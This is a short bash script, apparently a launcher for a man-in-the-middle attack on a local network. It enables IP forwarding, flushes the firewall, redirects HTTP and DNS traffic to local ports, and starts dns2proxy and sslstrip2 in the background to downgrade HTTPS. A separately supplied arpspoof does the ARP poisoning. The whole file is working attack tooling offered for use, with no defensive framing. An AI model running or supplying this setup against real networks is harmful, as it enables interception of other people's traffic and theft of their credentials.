#!/bin/bash
##Provide your own arpspoof; bi-directional
su

SOURCE="${BASH_SOURCE[0]}"
while [ -h "$SOURCE" ]; do # resolve $SOURCE until the file is no longer a symlink
  DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
  SOURCE="$(readlink "$SOURCE")"
  [[ $SOURCE != /* ]] && SOURCE="$DIR/$SOURCE" # if $SOURCE was a relative symlink, we need to resolve it relative to the path where the symlink file was located
done
DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"

echo "1" > /proc/sys/net/ipv4/ip_forward
iptables -t nat -F
iptables -F
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080 # (HTTP connections)
iptables -t nat -A PREROUTING -p tcp --dport 53 -j REDIRECT --to-ports 53 # (HTTP connections)
cd ${DIR}/dns2proxy-master/
python "${DIR}/dns2proxy-master/dns2proxy.py" &
cd ${DIR}
python "${DIR}/sslstrip2-master/sslstrip.py" -a -l 8080 &
wait
